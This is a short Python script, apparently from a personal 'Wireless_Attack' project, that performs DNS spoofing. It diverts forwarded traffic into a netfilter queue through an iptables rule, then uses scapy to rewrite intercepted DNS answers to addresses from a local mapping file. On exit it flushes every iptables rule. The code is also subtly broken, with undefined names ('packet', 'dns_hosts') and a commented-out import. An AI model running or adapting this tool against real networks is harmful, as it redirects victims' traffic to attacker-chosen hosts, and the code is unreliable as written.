from scapy.all import *
#from netfilterqueue import NetfilterQueue
import os
import time

dns_mappings = {}

def print_slow(str):
    for c in str:
        print(c, end='')
        time.sleep(0.5)
    print("")

# ----------------------------------------------------------------- #

def get_dns_mappings(input_file):
	file_t = open(input_file, "r")
	for line in file_t:
		data = line.split("+")
		dns_mappings[data[0]] = data[1]

# ----------------------------------------------------------------- #

def modify_response(pkt):
    qname_t = packet[DNSQR].qname  # DNS question name, the domain name
    if qname_t not in dns_hosts:
        return pkt
    print("Intercepted Record for ", pkt.summary())
    pkt[DNS].an = DNSRR(rrname=qname_t, rdata=dns_hosts[qname_t])
    pkt[DNS].ancount = 1   # set the answer count to 1

    # Flush old packet params, let scapy override
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[UDP].len
    del pkt[UDP].chksum

    print("Modified record: ", pkt.summary())
    return pkt


# ----------------------------------------------------------------- #

def netqueue_callback(pkt):

    pkt_ip = IP(pkt.get_payload())
    if pkt_ip.haslayer(DNSRR):
        try:
            pkt_ip = modify_response(pkt_ip)
        except IndexError:
            pass
        pkt.set_payload(bytes(pkt_ip))
    pkt.accept()

# ----------------------------------------------------------------- #

def main():
    print_slow("Loading local DNS mapping............")
    get_dns_mappings("C:\\Users\\tiger\\OneDrive\\Desktop\\Resume_Projects\\Wireless_Attack\\dns_mappings")

    """ 
    Thanks to Abdou Rockikz for NetFilterQueue IPTables starting code
   """

    QUEUE_NUM = 1
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()

    try:
    # bind the queue number to our callback `process_packet`
    # and start it
        queue.bind(QUEUE_NUM, netqueue_callback)
        queue.run()
    except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")



if __name__ == "__main__":
    main()